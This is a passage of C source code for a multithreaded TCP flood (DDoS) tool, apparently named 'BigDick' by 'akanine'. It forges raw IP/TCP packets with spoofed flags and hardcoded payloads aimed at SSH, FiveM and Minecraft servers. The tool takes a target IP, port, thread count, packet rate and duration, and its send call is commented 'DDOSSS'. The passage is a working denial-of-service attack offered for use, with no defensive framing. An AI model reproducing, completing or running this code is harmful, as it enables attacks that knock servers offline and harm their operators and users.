                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 6 ){
                        okakanine = sizeof(ping);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), ping, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 7 ){
                        okakanine = sizeof(skin);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), skin, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 8 ){
                        okakanine = sizeof(baltop);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), baltop, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 9 ){
                        okakanine = sizeof(siamemoji);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), siamemoji, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 10 ){
                        okakanine = sizeof(onepacket1);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), onepacket1, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 11 ){
                        okakanine = sizeof(bigdick);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), bigdick, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }
        } else if (payloads == 3){
                int okakanine = 0;
                char op[32] = "\xB3\xD4\x00\x16\x56\x75\x17\x4E\x00\x00\x00\x00\x80\x02\xFA\xF0\x14\xA4\x00\x00\x02\x04\x05\xB4\x01\x03\x03\x08\x01\x01\x04\x02"; //open Connections payloads
                char ssh[48] = "\xB3\xD4\x00\x16\x56\x75\x17\x4F\xD4\xE2\x51\x9A\x50\x18\x02\x04\x14\xB4\x00\x00\x53\x53\x48\x2D\x32\x2E\x30\x2D\x4D\x6F\x54\x54\x59\x5F\x52\x65\x6C\x65\x61\x73\x65\x5F\x30\x2E\x37\x37\x0D\x0A";//sshpayloa
                char bigdick[22] = "\x44\x44\x6F\x73\x20\x62\x79\x20\x62\x69\x67\x64\x69\x63\x6B\x20\x73\x63\x72\x69\x70\x74";
                randpacket = (rand() % 3) + 1;
                if(randpacket == 1 ) {
                        okakanine = sizeof(op);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), op, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine; //send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 0;
                        tcph->psh = 1;
                        tcph->ack = 1;
                } if(randpacket == 2 ) {
                        okakanine = sizeof(ssh);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), ssh, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;//send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->psh = 0;
                        tcph->ack = 0;
                }if(randpacket == 3 ){
                        okakanine = sizeof(bigdick);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), bigdick, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->psh = 0;
                        tcph->ack = 0;

                }
        } else if (payloads == 4) {
                int okakanine = 0;
                char fivem[32] = "\x75\xA8\xE2\xB8\xE2\xCE\xDD\xF9\x87\x2F\x9D\xDD\x80\x12\xFF\xFF\x47\xC8\x00\x00\x02\x04\x05\xAC\x01\x03\x03\x08\x01\x01\x04\x02"; //open Connections payloads
                char fivem2[32] = "\xE2\xB8\x75\xA8\x87\x2F\x9D\xDC\x00\x00\x00\x00\x80\x02\xFA\xF0\xE9\x2F\x00\x00\x02\x04\x05\xB4\x01\x03\x03\x08\x01\x01\x04\x02";//fivem payload
                char bigdick[22] = "\x44\x44\x6F\x73\x20\x62\x79\x20\x62\x69\x67\x64\x69\x63\x6B\x20\x73\x63\x72\x69\x70\x74";
                randpacket = (rand() % 3) + 1;
                if(randpacket == 1 ) {
                        okakanine = sizeof(fivem);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), fivem, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine; //send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->psh = 0;
                        tcph->ack = 1;
                        tcph->syn = 1;
                } if(randpacket == 2 ) {
                        okakanine = sizeof(fivem2);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), fivem2, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;//send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->psh = 0;
                        tcph->ack = 0;
                }if(randpacket == 3 ){
                        okakanine = sizeof(bigdick);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), bigdick, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->psh = 0;
                        tcph->ack = 0;

                }
        } else if (payloads == 5) {
                int okakanine = 0;
                char opt[12] = "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47"; //open Connections payloads
                randpacket = 1;
                if(randpacket == 1 ) {
                        okakanine = sizeof(opt);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), opt, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine; //send payloads
                        tcph->ack = 1;
	                tcph->window = htons(64240);
                        tcph->doff = ((sizeof(struct tcphdr)) + 12) / 4;
                        tcph->source = htons(5678);
	                tcph->check = 0;
                } 
        }

         
        int tcp_flag;
        if (Combo == 1) { //randdom tcp flag
            tcp_flag = (rand() % 5) + 1;
            if (tcp_flag == 1) { // SYN
                tcph->syn = 1;
                tcph->ack = 0;
                tcph->ack_seq = 0;
                tcph->fin = 0;
                tcph->psh = 0;
                tcph->urg = 0;
                tcph->urg_ptr = 0;
                tcph->rst = 0;
            } else if (tcp_flag == 2) { // ACK
                tcph->syn = 0;
                tcph->ack = 1;
                tcph->ack_seq = rand();
                tcph->fin = 0;
                tcph->psh = 0;
                tcph->urg = 0;
                tcph->urg_ptr = 0;
                tcph->rst = 0;
            } else if (tcp_flag == 3) { // RST
                tcph->syn = 0;
                tcph->ack = 0;
                tcph->ack_seq = 0;
                tcph->fin = 0;
                tcph->psh = 0;
                tcph->urg = 0;
                tcph->urg_ptr = 0;
                tcph->rst = 1;
            } else if (tcp_flag == 4) { // PSH
                tcph->syn = 0;
                tcph->ack = 0;
                tcph->ack_seq = 0;
                tcph->fin = 0;
                tcph->psh = 1;
                tcph->urg = 0;
                tcph->urg_ptr = 0;
                tcph->rst = 0;
            } else if (tcp_flag == 5) { // SYN-ACK
                tcph->syn = 1;
                tcph->ack = 1;
                tcph->ack_seq = 0;
                tcph->fin = 0;
                tcph->psh = 0;
                tcph->urg = 0;
                tcph->urg_ptr = 0;
                tcph->rst = 0;          
            }
        }
        

        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); //DDOSSS

		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 8){
		fprintf(stderr, "Invalid parameters tcp-Dick Code by akanine 28/5/2023 :) \n");
                fprintf(stderr, "Payloads 0 = bigtcp / 1 = abus / 2 = minecraft / 3 = ssh / 4 = fivem-tcp\n");
		fprintf(stdout, "Usage: %s <target IP> <port / 0 for random ports> <threads> <pps> <time> <rand> <payload>\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "BigDick by akanine pew pew pew\n");

	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
        Combo = atoi(argv[6]);
        payloads = atoi(argv[7]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 20;

	int i;
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	}
	fprintf(stdout, "Starting Flood...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}

